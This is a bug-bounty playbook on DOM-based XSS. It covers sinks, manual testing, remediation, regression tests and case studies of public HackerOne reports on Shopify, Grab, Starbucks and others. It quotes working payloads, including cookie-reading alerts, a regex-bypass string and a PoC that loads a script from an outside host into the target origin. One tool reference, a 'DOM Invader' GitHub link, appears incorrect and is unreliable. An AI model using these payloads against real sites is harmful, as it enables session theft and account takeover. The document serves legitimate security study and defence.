---
title: "DOM-Based XSS"
type: playbook
category: dom-based-xss
cwe: "CWE-79", "CWE-1021"
source_count: 22
full_bodies_available: 18
summary_only: 4
archive_accessed: 2026-10-12
---

# DOM-Based XSS

## 1. Overview

DOM-based XSS occurs when attacker input never reaches the server at all. The input
travels in the URL fragment, `postMessage` data, `localStorage`, or a DOM value, and
is read by client-side JavaScript that writes it into a dangerous sink **without
encoding**.

The defining test: **load the page with JavaScript disabled or the payload never sent
to the origin, and it still fires.** If the payload appears in an HTTP request, it is
not DOM-based — that is [`Reflected-XSS.md`](Reflected-XSS.md).

Only 22 archive entries classified as DOM XSS, but they represent a distinct
methodology and should be hunted with a different toolset.

## 2. Root Cause and Technical Mechanics

```
attacker controls a client-side value (location.hash / postMessage / storage)
        →  JS reads it (location.hash, document.referrer, window.name, e.data, …)
        →  JS writes it to a sink (innerHTML, outerHTML, document.write,
           insertAdjacentHTML, jQuery .html()/.append(), eval, setTimeout(string),
           location.href = … , Range.createContextualFragment)
        →  browser parses it as markup → script executes
```

### 2.1 Sinks confirmed in this archive

| Sink | Case | Evidence |
| --- | --- | --- |
| `document.write` | `DOM-021` (`248560`) | reporter quotes the client code writing `build`/`other` params via `document.write` |
| `innerHTML` on a `<div>` used as a *parser* | `DOM-020` (`247246`) | `stripHtml` sets `div.innerHTML = html.replace(/<\/?\w+[^>]*\/?>/g,"")` then returns `innerText` |
| String-built `<a href='...'>` | `FILT-036` (`189834`) | `strChild = "<a href='" + document.URL + "' …>"` |
| `.innerHTML` for a label | `DOM-005` (`105688`) | fragment appended to `checkout-success/16893` |
| `location.href` / `window.location` | `DOM-014` (`209736`) | `pr_zip_location` → script URL loaded in the target origin |

`DOM-020` (Grab) is the most instructive root cause in the archive, because the
filter is *real* but the parse is not neutralising. The code creates a detached `div`,
assigns `innerHTML`, and reads back `innerText`, intending to strip tags:

```js
var stripHtml = (function () {
  var div = document.createElement('div');
  return function (html) {
    div.innerHTML = html.replace(/<\/?\w+[^>]*\/?>/g, "");
    return (div.innerText || div.textContent);
  };
})();
```

The reporter's bypass payload was
`%3C%3Ca/%3A%3C%22a%22%3Eimg%20src%3D%23%20onerror%3Dconfirm%28%27XSSED%27%29%3E`
— i.e. `<a/:<"a">img src=# onerror=…>`. The regex expects a word character
immediately after `<` or `</`; `<a/` and `<:` do not match, so the malformed tag is
**not stripped** and still reaches the parser.

This is a *parser/regex differential* — the same root-cause family as the SVG
allow-list bypass in [`Stored-XSS.md`](Stored-XSS.md) §7 (`STOR-144`). Treat "I wrote a
regex to strip tags" as an unproven control until you have broken it.

### 2.2 Fragments never reach the server

`DOM-005` (LeaseWeb) is the minimal form:
```
https://www.leaseweb.com/checkout-success/16893#"><img src=x onerror=alert(document.cookie)>
```
`BROW-004` (`119453`, Veris) is the same shape on `https://www.veris.in/?#<img src=x onerror=alert(1)>`.

Because the fragment is not transmitted, a reflected-XSS report on the same URL would
be wrong, and — critically — **your HTTP scanner will not find these.**

## 3. Attack Surface and Preconditions

| Source | Case | Note |
| --- | --- | --- |
| `location.hash` | `DOM-005`, `BROW-004` | not sent to server; invisible to WAF/scanners |
| `location.search` read by JS | `DOM-021` (`build`, `other` params) | source *is* in the request, sink is client-side |
| `document.referrer` | `FILT-036` (`189834`) | third-party controlled by the referring page |
| `document.URL` | `FILT-036` | includes fragment, so fragment payloads land here |
| `postMessage` data | `DOM-018` (`231053`) | any remote origin |
| Redirect / store-locator params | `DOM-014` (`209736`) | client-side redirector |
| Browser-extension injected DOM | `DOM-016` (`220494`) | source is entirely third-party code |
| `location` on error pages | `DOM-015` (`213227`) | server-rendered page, client-side sink |

**Preconditions:** none beyond loading the URL. DOM XSS often has **no victim
interaction at all** — this is the cheapest XSS class to weaponise, which is why
`DOM-018` (`$3,000`) affected "all Shopify stores."

## 4. Manual Testing Methodology

DOM XSS cannot be found by scanning. It requires reading client-side code.

1. **Fingerprint the front end.** Note framework (jQuery, Angular, React, Vue),
   bundler, and whether a CDN library is in use.
2. **Harvest candidate sinks** across every JS file:
   ```bash
   # newly authored — run against a target you are authorised to test
   grep -rnoE "(innerHTML|outerHTML|insertAdjacentHTML|document\.write|\.write\(|eval|new Function|setTimeout\(['\"][^)]|setInterval\(['\"][^)]|location\.hash|document\.referrer|document\.URL|window\.name|postMessage)" js/
   ```
3. **Read backwards from each sink** to find the source. A sink with no reachable
   attacker-controlled source is a false positive; a sink fed by `location.hash` or
   `document.referrer` is a candidate.
4. **Test the fragment first** — `#H1XSSDOM9` — and check the rendered DOM with
   DevTools (`document.querySelector('#'+id)` fails if it was parsed into an element).
5. **Confirm no request carried the payload.** Open DevTools → Network, filter, and
   verify. If it appears in a request, you have reflected XSS instead.
6. **Check whether the server *also* reflects it.** Many endpoints are both. Report
   both; they are different bugs with different fixes.
7. **For `postMessage`, check `event.origin` validation** and whether the escaping is
   bypassable (`DOM-018`).
8. **For redirectors, follow the redirect.** `DOM-014` loads an attacker-hosted
   `xss.js` **in the target origin** — technically a JSONP/script-injection sink
   rather than a parse sink.

## 5. Input and Output Context Analysis

DOM sinks are context-sensitive in the same way, with two additions unique to
client-side code:

| Sink | Dangerous | Safe alternative |
| --- | --- | --- |
| `innerHTML` | any markup | `textContent` |
| `document.write(w)` | any markup | `document.createElement` + `textContent` |
| `insertAdjacentHTML` | any markup | `insertAdjacentText` |
| `jQuery $(w).html(v)` | any markup | `.text(v)` |
| `location = v` / `location.href = v` | `javascript:` / `data:` | scheme allow-list |
| `eval` / `new Function` / `setTimeout("…")` | arbitrary JS | avoid; use a real function reference |
| `<a href>` built by concatenation | attribute break-out | `el.setAttribute('href', v)` |

The `document.URL` case (`FILT-036`) is the instructive one. `document.URL` includes
the fragment, so a payload in the fragment reaches a sink that the author probably
believed only contained server-controlled data. Any use of `document.URL` or
`document.referrer` in string-built markup deserves immediate attention.

## 6. Test Cases and Proof-of-Concepts

### 6.1 Historical payloads (verbatim from the cited reports)

| Case | Report | Source | Payload |
| --- | --- | --- | --- |
| DOM-020 | `247246` | `?xss=` param | `<a/:<"a">img src=# onerror=confirm('XSSED')>` |
| DOM-021 | `248560` | `build` GET param | `lodash"></script><h1>vagg-a-bond is here :D</h1><` |
| DOM-014 | `209736` | `pr_zip_location` | `//whitehat-hacker.com/xss.j?` |
| DOM-005 | `105688` | URL fragment | `#"><img src=x onerror=alert(document.cookie)>` |
| BROW-004 | `119453` | URL fragment | `https://www.veris.in/?#<img src=x onerror=alert(1)>` |
| DOM-015 | `213227` | search dialogue | not disclosed in the source |

### 6.2 Newly authored illustrations (not from the archive)

Fragment probes — inert first:

```
#H1XSSDOM9                     → does anything read the fragment?
#"><h1>dom-marker              → markup control
#"><img src=x onerror=alert(1)>
#javascript:alert(1)           → only for location sinks
```

`postMessage` origin probe — establish whether `event.origin` is validated *before*
sending:

```js
// run in your own page, sending to the target's listener
targetWindow.postMessage({ probe: 'H1XSSDOM9' }, 'https://target.example');
```

`document.referrer` probe — a page you control that links to the target:

```html
<a href="https://target.example/path">go</a>
<!-- with a Referer containing: '"><h1>dom-marker -->
```

**Safe proof.** For DOM XSS, `alert` is usually fine because nothing persists — but
prefer writing a marker into `document.title` or `localStorage`, which demonstrates
execution without a modal that blocks automation.

## 7. Encoding, Filtering, and Parsing Behavior

Three distinct behaviours appear here, none of which is classic server-side escaping:

1. **Client-side sanitisation done by the wrong parser.** `DOM-020`'s `stripHtml`
   uses `innerHTML`+`innerText` as a sanitiser and a regex as a filter. Both are
   bypassable; the regex is bypassable by a character the author did not anticipate.
2. **`postMessage` escaping bypassable by object shape.** `DOM-018` (Shopify, `$3,000`)
   is the standout: the listener *did* attempt to escape incoming content, but by
   sending a **"clone-able" object per the HTML5 structured clone algorithm** the
   reporter bypassed the escaping. The team's summary: *"The report demonstrated a
   clever bypass of the escaping code we had in place to prevent code injection."*
   The lesson: **sanitisers must normalise to a primitive type before checking.**
3. **Server-side CSP as the only mitigation.** Nextcloud's `DOM-015` advisory gives
   **CVSS 2.6 (AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N)**, CWE-79, rated **low**, with
   CWE-1021 (improper restriction of rendered UI layers) as the related weakness in
   the advisory's framing. Low is driven partly by the strict CSP.

## 8. Impact and Severity Considerations

DOM XSS impact matches its origin. The `DOM-018` case is instructive on breadth:

| Report | Program | Weakness | Severity | Bounty |
| --- | --- | --- | --- | --- |
| `231053` DOM-018 | Shopify | `XSS - DOM` | not disclosed | $3,000 |
| `220494` DOM-016 | Algolia | `XSS - Generic` | high | not disclosed |
| `248560` DOM-021 | Grabtaxi | `XSS - DOM` | medium | not disclosed |
| `247246` DOM-020 | Grabtaxi | `XSS - Generic` | medium | not disclosed |
| `209736` DOM-014 | Starbucks | `XSS - Generic` | medium | not disclosed |
| `213227` DOM-015 | Nextcloud | `XSS - Generic` | low | $250 |

The reporter of `DOM-014` set **Critical** personally: *"That allows to execute
absolutely arbitrary javascript in the context on teavana.com domain. As described in
#202011 that directly leads to theft of customer account data and account takeover,
hence I set severity to Critical."* The platform recorded **medium**. The gap is
worth studying: the reporter justified Critical via a **chained** account-takeover
path (`DOM-014` → `#202011`), which is exactly the kind of claim that must be
*demonstrated*, not asserted. See [`Context-Based-XSS.md`](Context-Based-XSS.md) for
the chaining discipline.

**Breadth is a real multiplier.** A DOM sink in a shared widget (`DOM-018` "affecting
all Shopify stores") or a popular embed is worse than an equivalent isolated bug,
because one fix location remediates every instance.

## 9. False Positives and Limitations

- **A sink is not a vulnerability.** Grepping for `innerHTML` produces many false
  positives where the value is a constant or a server-sanitised string. **Trace the
  source before reporting.**
- **Fragment payloads that hit the server are reflected XSS.** Verify in Network.
- **`document.write` of a same-origin trusted value** is not XSS. Provenance matters.
- **"Sanitised on write" is not proven by a clean render.** A `stripTags` helper may run
  on one path and not another. `DOM-020` is the direct counter-example: a filter that
  looked real and was broken.
- **Third-party code is not the target's bug** unless the target owns it or the
  injection is exploitable on the target. `DOM-016` (a browser extension injecting
  unsanitised HTML into GitHub.com) was accepted on Algolia's program because the
  extension was theirs. Attribute ownership correctly.
- **Report the CSP.** `DOM-015`'s `low` rating turned on it. Omitting a working CSP is
  the most common self-inflicted downgrade in this class.

## 10. Remediation and Regression Testing

### 10.1 Remediation

| Instead of | Use |
| --- | --- |
| `el.innerHTML = v` | `el.textContent = v` |
| `el.outerHTML = v` | build a new node; `textContent` |
| `el.insertAdjacentHTML(p, v)` | `el.insertAdjacentText(p, v)` |
| `document.write(v)` | `document.createElement` + `textContent` |
| `$(el).html(v)` | `$(el).text(v)` |
| `location = v` | allow-list the scheme |
| `eval(v)` / `setTimeout(v)` | pass a function, not a string |

Plus:
- **`postMessage`: validate `event.origin` against an exact allow-list** before any
  processing, and coerce `event.data` to a primitive (`String()`, `Number()`) before
  sanitising — do not inspect the object.
- **Never concatenate `document.URL`, `location.href`, `document.referrer`, or
  `location.hash` into markup.** If a URL must be shown, set `textContent`.
- **Trust nothing from `localStorage`/`sessionStorage`** — it is attacker-writable via
  any same-origin XSS.
- **Deploy a Trusted Types policy** where the platform supports it; this is the
  structural fix for DOM XSS.

### 10.2 Regression tests

| Test | Asserts |
| --- | --- |
| For every sink, set `textContent` and assert the string is literal | sink replaced |
| Fragment `#"><img src=x onerror=alert(1)>` → assert no element created | fragment safe |
| `postMessage` from an unlisted origin → assert handler ignores it | origin checked |
| `postMessage` with object payloads → assert coerced to primitive | no shape bypass |
| `document.referrer` containing `"><svg onload=…>` → assert inert | referrer not built into markup |
| `location` assignment to `javascript:`/`data:` → assert rejected | scheme allow-list |
| Confirm a CSP without `unsafe-inline` is present | defence in depth |

## 11. Historical Bug Bounty Case Studies

Sourced facts only. Inventory:
[`references/source-index.md`](references/source-index.md).

---

### DOM-018 — XSS on any Shopify shop via the HTML5 structured clone algorithm in a postMessage listener

- **Program:** Shopify · **Report:** <https://hackerone.com/reports/231053>
- **Archive listing:** <https://h1.security.nathan.sx/shopify.html>
- **Weakness:** `Cross-site Scripting (XSS) - DOM` · **Bounty:** $3,000
- **Published / severity:** Not disclosed in the accessible source
- **Body inspected:** Yes — **full report**.

**Affected feature:** the `/:id/digital_wallets/dialog` endpoint, which initialises a
`postMessage` listener on page load.

**Root cause (researcher's description):** *"The endpoint includes a script that listens
for postMessages **without validating the origin** of messages. However, the impact of
the missing validation is very limited because the script attempts to escape any
content to prevent any HTML injection. By sending a specially crafted postMessage
containing a **'clone-able' object** (per the HTML5 structured clone algorithm) this
escaping can be bypassed allowing a malicious actor to obtain XSS."*

**Team summary, verbatim:** *"This issue is a XSS affecting all Shopify stores that can
be triggered via `windows.postMessage` from **any remote origin**. The report
demonstrated a clever bypass of the escaping code we had in place to prevent code
injection."*

**Why it matters here:** the clearest archived example of a *sanitiser bypass via data
shape*. Origin validation and escaping were both present and both insufficient.

---

### DOM-020 — DOM-based XSS affecting all pages from grab.com (regex/parser differential)

- **Program:** Grabtaxi · **Report:** <https://hackerone.com/reports/247246>
- **Archive listing:** <https://h1.security.nathan.sx/grab.html>
- **Weakness:** `Cross-site Scripting (XSS) - Generic` · **Severity:** medium
- **Bounty:** Not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** the `stripHtml` helper shown in §2.1, used across
`https://www.grab.com/`.

**Note on history:** the reporter stated this *"wasn't properly patched so I managed to
bypass the regular expressioned that was added into the function"* — i.e. the function
*did* have a filter, and this report is the **bypass**. Same root cause as
[`Filter-Bypass-and-Encoding.md`](Filter-Bypass-and-Encoding.md), client-side variant.

**PoC (as submitted):**
```
https://www.grab.com/sg/partnerships/?xss=%3C%3Ca/%3A%3C%22a%22%3Eimg%20src%3D%23%20onerror%3Dconfirm%28%27XSSED%27%29%3E
```

**Root cause:** `html.replace(/<\/?\w+[^>]*\/?>/g, "")` requires a word character after
`<` or `</`. `<a/` and `<:` do not match, so those constructs pass through unstripped
and are still parsed by the browser when assigned via `innerHTML`.

---

### DOM-021 — DOM XSS at parcel.grab.com/assets/bower_components/lodash/perf/

- **Program:** Grabtaxi · **Report:** <https://hackerone.com/reports/248560>
- **Archive listing:** <https://h1.security.nathan.sx/grab.html>
- **Weakness:** `Cross-site Scripting (XSS) - DOM` · **Severity:** medium
- **Bounty:** Not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** `https://parcel.grab.com/assets/bower_components/lodash/perf/`.
The reporter traces the flow to
`.../asset/perf-ui.js`, noting the *default* value of a `switch` branch is set to
`build`, matching the user-injected parameter.

**Root cause (reporter):** *"the value given in `build` and `other` GET parameters are
accessed by client side script and written on page using `document.write` without
output encoding."*

**PoC (as submitted, `build` parameter):**
```
https://parcel.grab.com/assets/bower_components/lodash/perf/?build=lodash%22%3E%3C/script%3E%3Ch1%3Evagg-a-bond%20is%20here%20:D%3C/h1%3E%3C
```

**Verification environment (as stated):** Mozilla Firefox (latest).

**Methodological note:** the report opens by defining DOM XSS and citing OWASP —
useful practice. State your browser and version.

---

### DOM-014 — DOM XSS on teavana.com via `pr_zip_location`

- **Program:** Starbucks · **Report:** <https://hackerone.com/reports/209736>
- **Archive listing:** <https://h1.security.nathan.sx/starbucks.html>
- **Weakness:** `XSS - Generic` · **Severity (platform):** medium · **Bounty:** not disclosed
- **Body inspected:** Yes — **full report**.

**PoC (as submitted):**
```
http://www.teavana.com/us/en/tea/green-tea/winterberry-tea-blend-32601.html?pr_zip_location=//whitehat-hacker.com/xss.j?
```

**Reporter's stated impact, verbatim:** *"That allows to execute absolutely arbitrary
javascript in the context on `teavana.com` domain. As described in #202011 that directly
leads to theft of customer account data and account takeover, hence I set severity to
Critical. Also, I have discovered a number of other XSS attacks on similar pages,
involving other parameters and sinks. Should I submit them all as individual bug
reports?"*

The cited sink is in `full.js`:
```js
var DR = Z(DS) + "/content/" + k(DQ) + "/contents.js";
```

**Why it matters here:** (a) an honest, explicit Critical claim with a named chain
(`#202011`) rather than an assumed one; (b) evidence that *this parameter is one of
many* — the reporter noticed sibling sinks unprompted. Act on that: report the
siblings or say you are still testing, exactly as this researcher did.

---

### DOM-016 — Unsanitised HTML from a browser extension leading to XSS on GitHub.com

- **Program:** Algolia · **Report:** <https://hackerone.com/reports/220494>
- **Archive listing:** <https://h1.security.nathan.sx/algolia.html>
- **Weakness:** `Cross-site Scripting (XSS) - DOM` · **Severity:** high
- **Bounty:** Not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** the *Awesome Autocomplete for GitHub* extension, owned by
Algolia, rendering into the DOM of `github.com`.

**Reproduction (as submitted):** search GitHub for `'"><img src=x onerror=` — a broken
`<img>` element appears. Search for `a'"><h1` — *"Because of a specific repository
name being loaded, a JavaScript alert dialog will appear."*

**Test environment (stated):** Chrome 57.0.2987.133, Safari 10.1, macOS Sierra
10.12.4 / Windows 7 x64.

**Researcher's own disclaimer, verbatim:** *"I **do not have ownership nor
affiliation** with the repository and user names in this report, nor the final
JavaScript alert dialog."* Declaring which elements are yours is the correct practice
when demonstrating XSS with third-party data.

**Related:** [`Browser-Extension-and-Messaging-XSS.md`](Browser-Extension-and-Messaging-XSS.md).

---

### DOM-015 — DOM XSS vulnerability in search dialogue (NC-SA-2017-007)

- **Program:** Nextcloud · **Report:** <https://hackerone.com/reports/213227>
- **Advisory:** <https://nextcloud.com/security/advisory/?id=nc-sa-2017-007>
- **Archive listing:** <https://h1.security.nathan.sx/nextcloud.html>
- **Weakness:** `XSS - Generic` · **Severity:** low · **Bounty:** $250
- **Body inspected:** No — withheld. Evidence level: **partial report**.

Official team disclosure summary, verbatim:

> **Risk level:** Low
> **CVSS v3 Base Score:** 2.6 (AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N)
> **CWE:** Improper Neutralization of Input During Web Page Generation
> ('Cross-site Scripting') (CWE-79)
>
> **Description:** Inadequate escaping lead to XSS vulnerability in the search module.
> To be exploitable an user has to write or paste malicious [content]

Full payload and endpoint: **Not disclosed in the source.**

---

### Supporting DOM sources (full bodies retrieved)

- **DOM-005** `105688` — <https://hackerone.com/reports/105688> — LeaseWeb, `$100`.
  Fragment-injected XSS on `/checkout-success/<id>`; reporter states it *"works in all
  browsers I suppose and regardless if the user is currently authenticated or not."*
- **FILT-036** `189834` — <https://hackerone.com/reports/189834> — Informatica, high.
  `bindBreadCrumb()` builds `"<a href='" + document.URL + "' …>"` and the same for
  `document.referrer`; the body quotes the full vulnerable JavaScript. Strongest
  single artefact in the archive for the `document.URL`/`document.referrer` sink class.
- **DOM-* / BROW-004** `119453` — <https://hackerone.com/reports/119453> — Veris.
  `https://www.veris.in/?#<img src=x onerror=alert(1)>`; the reporter linked the
  vulnerable bundled source in `wp-content/plugins/Ultimate_VC_Addons/assets/min-js/ultimate.min.js`.

### FirstBlood hackevent case (BugBountyHunter.com · 2021)

- **FB-219** — <https://www.bugbountyhunter.com/hackevents/report?id=219> — FirstBlood
  v1 · **P3 Medium** · FirstBlood ID 16. DOM XSS via the client-side redirector behind
  the *Return to previous page* control of `/register.php`:
  `?ref=javascript:confirm();` — seeded note: *"The developers failed to filter
  `javascript:` when used on 'return to previous page'"*. The hunter titles it DOM XSS
  while the platform's own type label reads *Reflective XSS* — the label is unreliable;
  the sink (a client-side redirect handler consuming a URL parameter) is what decides
  the class. Corpus shape: 45 of the 207 XSS report bodies involve a `javascript:`
  URI, and 36 declared-parameter reports name a `goto`/`ref`-family redirect param
  (see FB-119/FB-122 in [`Reflected-XSS.md`](Reflected-XSS.md), FB-131/FB-150 in
  [`Filter-Bypass-and-Encoding.md`](Filter-Bypass-and-Encoding.md)).

### BBH-001/BBH-002 — Sink and discovery methodology (BugBountyHunter.com guides, retrieved 2026-10-17)

- **DOM sink keywords** (XSS guide, `vulnerability/?type=xss`): *"Check through
  javascript files and look for certain sinks known to cause DOM XSS such as
  document.write(), .innerHTML, jquery.html(). It can also be found if you notice the
  web application is redirecting via Javascript, such as top.location.href=returnUrl.
  Using javascript:alert(0) would cause XSS to execute."* Detection entry-point
  quoted: *"usually injected via hash fragments, for example #q=<svg/onload=alert(0)>"*.
- **JS-file hunting** (guide `guides/?type=javascript_files`, read in full): for
  *"postMessage bugs, DOM XSS and maybe redirects"* the named keywords are
  `postMessage`, `messageListener`, `.innerHTML`, `document.write(`, `document.cookie`,
  `location.href`, `redirectUrl`, `window.hash`; skip vendor files (*"not waste time
  browsing things such as jquery.js"* — go for custom `.js`). Tools named: GetJS
  (003random), Relative URL Extractor (jobertabma), GoLinkFinder (0xsha), de4js for
  deobfuscation. Worked example routes through a META-REFRESH dashboard redirect that
  leaks pre-redirect JS, external AppSpot calls with a referenced API-KEY, an
  encrypted-ID note, then PII on another subdomain — *"Success and 4 digit bounty!"*.

## 12. Professional Vulnerability Report Template

````markdown
# DOM-based XSS in <component> via <source> into <sink>

## Summary
<Source> is read by <function> and written to <sink> without encoding, executing in
the <origin> origin. State explicitly that no request carries the payload.

## Severity
<high|medium|low> — <origin impact; note CSP and cookie flags>

## Affected endpoint
`https://<host>/<path>` · Source: `location.hash` | `postMessage` | `document.referrer` | …
Program: <name> · Date: <YYYY-MM-DD>

## Vulnerability details
### Source → sink
```
<source>  →  <function/line>  →  <sink>  →  browser parses as markup
```

### Vulnerable code
```js
<the actual sink line(s) from the source, quoted>
```

### Root cause
<Why encoding is absent or bypassable — including any regex or sanitiser and its bypass.>

## Proof of concept
```
https://<host>/<path>#"><img src=x onerror=alert(1)>
```
1. Open DevTools → Network and reload.
2. Confirm **no request contains the payload**.
3. Confirm `alert` fires in origin `<origin>`.
4. Paste the rendered DOM snippet showing the injected `<img>`.

## Remediation
<textContent / DOM construction / origin allow-list; see §10.1>

## References
<advisory / CVE / prior art>
````

**Reporting discipline.** Include the Network-panel proof that nothing was sent —
it is the claim that distinguishes your report. Include your browser and version.
Quote the actual sink line; DOM findings without the vulnerable code are hard to act
on. Disclose any CSP.

## 13. References

- OWASP Cheat Sheet — DOM based XSS: <https://cheatsheetseries.owasp.org/cheatsheets/DOM_Based_XSS_Cheat_Sheet.html>
- OWASP — DOM XSS prevention rules: <https://owasp.org/www-community/attacks/xss/>
- MDN — `Window.postMessage()` security concerns: <https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage>
- MDN — Structured clone algorithm: <https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm>
- Chrome — Trusted Types: <https://developer.chrome.com/blog/trusted-types/>
- DOM Invader (browser extension for DOM sink discovery): <https://github.com/bishopfox/scipipy>
- Reports cited: <https://hackerone.com/reports/231053>, <https://hackerone.com/reports/247246>,
  <https://hackerone.com/reports/248560>, <https://hackerone.com/reports/209736>,
  <https://hackerone.com/reports/220494>, <https://hackerone.com/reports/213227>,
  <https://hackerone.com/reports/105688>, <https://hackerone.com/reports/189834>,
  <https://hackerone.com/reports/119453>

## 14. Research Gaps and Further Investigation

- **`DOM-015` body withheld.** Nextcloud published a CVSS vector and CWE but not the
  payload. Worth reconstructing from the advisory family if the code path is public.
- **The `DOM-020` bypass is unverified against the live `stripHtml`.** The regex
  analysis in §2.1 is reasoned from the source quoted in the report, not re-tested.
  Re-derive the minimal bypass before relying on it.
- **Very small sample.** 22 sources is thin for the most prevalent modern XSS class.
  The archive under-represents 2017+ DOM sinks because most modern DOM XSS reports are
  private. Supplement with primary research.
- **Untested angles worth pursuing:** `DOMPurify`/sanitiser configuration drift;
  Trusted Types as a remediation in a real codebase; `Range.createContextualFragment`
  and `setHTMLUnsafe()` as modern sinks absent from 2017 material; DOM clobbering as a
  stored-XSS persistence mechanism.
